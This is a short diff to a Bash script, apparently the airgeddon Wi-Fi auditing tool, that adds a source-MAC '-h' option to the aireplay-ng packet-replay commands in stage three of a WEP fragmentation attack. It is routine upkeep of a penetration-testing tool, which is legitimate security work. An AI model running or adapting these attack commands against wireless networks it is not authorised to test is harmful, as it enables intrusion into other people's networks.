@@ -4364,10 +4364,10 @@ function set_wep_script() {
 					wep_fragmentation_phase2_pid_alive=\$(ps uax | awk '{print \$2}' | grep -E "^\${wep_fragmentation_phase2_pid}$" 2> /dev/null)
 					if [[ -z "\${wep_fragmentation_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}fragmentation.cap" ]]; then
 						kill_tmux_window_by_name "Fragmentation Attack (2/3)"
-						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
+						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -h \"${current_mac}\" -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
 
 						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
-							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
+							get_tmux_process_id "aireplay-ng -2 -F -h \"${current_mac}\" -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
 							wep_script_processes+=("\${global_process_pid}")
 							global_process_pid=""
 						else
